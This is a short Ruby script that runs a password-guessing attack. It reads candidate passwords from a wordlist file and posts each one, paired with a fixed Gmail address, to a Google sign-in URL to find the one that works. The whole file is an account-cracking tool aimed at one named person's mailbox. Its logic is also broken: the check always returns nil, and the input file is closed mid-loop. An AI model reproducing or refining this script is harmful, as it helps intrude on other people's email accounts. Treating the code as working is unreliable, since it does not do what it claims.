require 'net/http'
require 'uri'

def is_wrong_password? password
  uri = URI.parse 'https://accounts.google.com/signin/v2/sl/pwd?service=mail&passive=true&rm=false&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ss=1&scc=1&ltmpl=default&ltmplcache=2&emr=1&osid=1&flowName=GlifWebSignIn&flowEntry=AddSession&cid=0&navigationDirection=forward'
  response = Net::HTTP.post_form(uri, :login => "7495500@gmail.com", :password => password).body
  puts response.include? "logo"
end

input = File.open "files/passwords.txt", "r"

while (line = input.gets)
  line.strip!

  print "Trying password #{line} - "

  if is_wrong_password? line
    puts "Error!"
    input.close
  end
end
